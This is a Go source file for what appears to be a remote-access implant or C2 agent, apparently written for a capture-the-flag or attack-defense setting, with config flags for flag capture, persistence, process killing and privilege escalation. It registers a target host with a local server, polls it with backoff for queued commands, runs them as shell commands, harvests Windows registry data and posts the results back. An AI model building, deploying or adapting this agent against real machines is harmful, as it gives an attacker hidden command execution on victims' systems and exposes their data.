package main
import (
	"log"
	"bytes"
	"strings"
	"encoding/json"
	"time"
	"os/exec"
)
type Target_base_Info struct{
	Ip string
	System string
	Pc_name string
	Create_time time.Time
}
type System_config_Info struct{
	Flag_get_enable bool 
	Flag_send_type string
	Persistence_enable bool
	Kill_process_enable bool
	Privilege_promotion_enable bool
}
type Target_info struct{
	Target_base_info Target_base_Info
	System_config_info System_config_Info
}

type Cmd_info struct{
	Id int
	Target_id int
	Cmd_type string
	Cmd_value string
	Cmd_time time.Time
	Cmd_exec bool
	Cmd_exec_time time.Time
	Cmd_exec_result string
	Cmd_cycle_period_second int
}

const(
	get_registry = "getRegistryInfo"
)

var server_addr = "http://127.0.0.1:8080/create_target"
var get_target_info_addr = "http://127.0.0.1:8080/get_target_info/"
var get_cmd_not_exec_info_addr = "http://127.0.0.1:8080/get_cmd_not_exec/"
var update_cmd_not_exec_info_addr = "http://127.0.0.1:8080/update_cmd_result"
var delay_time = 5
var Target_info_b = Target_info{}

func get_target_info(){
	delay_time_temp := delay_time
	info := GetInfo()
	for {
		Target_info_b.Target_base_info.Ip="10.10.10.111"
		Target_info_b.Target_base_info.System= info.Sys_info.Sys_os
		Target_info_b.Target_base_info.Create_time = time.Now()
		data,_ := json.Marshal(Target_info_b.Target_base_info)
		Send_info(server_addr,string(data))
		Target_info_bb,err := Get_info(get_target_info_addr,Target_info_b.Target_base_info.Ip)
		if err != nil{
			log.Println(err)
			if delay_time_temp < 24*60*60{
				delay_time_temp = delay_time_temp +1
			}
		}else{
			Target_info_b = Target_info_bb
			log.Println(Target_info_bb)
			return
		}
		time.Sleep(time.Duration(delay_time_temp)*time.Second)
	}
}

func runCmd(cmdStr string)(string,error){
	list := strings.Split(cmdStr, " ")
	cmd := exec.Command(list[0],list[1:]...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil{
		return stderr.String()+"\n"+err.Error(),err
	}else{
		return out.String(),nil
	}
}

func main(){
	delay_time_temp := delay_time
	get_target_info()
	for{
		cmd_infos,err := Get_Cmds_not_exec_info(get_cmd_not_exec_info_addr,Target_info_b.Target_base_info.Ip)
		if err != nil{
			log.Println(err)
			if delay_time_temp <= 24*60*60{
				delay_time_temp = delay_time_temp +1
			}
		}else{
			for _,cmd_info := range(cmd_infos){
				log.Println(cmd_info)
				if cmd_info.Cmd_type == "cmd"{
					cmd_info.Cmd_exec_result, err = runCmd(cmd_info.Cmd_value)
					log.Println(cmd_info.Cmd_exec_result)
					if err != nil{
						log.Println(err)
					}else{
						cmd_info.Cmd_exec = true
						cmd_info.Cmd_exec_time = time.Now()
						data,_:=json.Marshal(cmd_info)
						Send_info(update_cmd_not_exec_info_addr, string(data))
					}
				}else if cmd_info.Cmd_type == "control"{
					switch cmd_info.Cmd_value {
						case get_registry:
							if Target_info_b.Target_base_info.System =="windows"{
								registry_infos := Get_registry_infos()
								var result string
								for v,k := range(registry_infos){
									k_result,_ := json.Marshal(k)
									result += v+":"+string(k_result)+"\n"
								}
								cmd_info.Cmd_exec_result = string(result)
							}else{
								cmd_info.Cmd_exec_result = "Error:Only windows support registry!"
							}
							cmd_info.Cmd_exec = true
							cmd_info.Cmd_exec_time = time.Now()
							data,_:=json.Marshal(cmd_info)
							Send_info(update_cmd_not_exec_info_addr,string(data))
					}
				}
				delay_time_temp = delay_time
			}
		}
		 time.Sleep(time.Duration(delay_time_temp)*time.Second)
	}
}
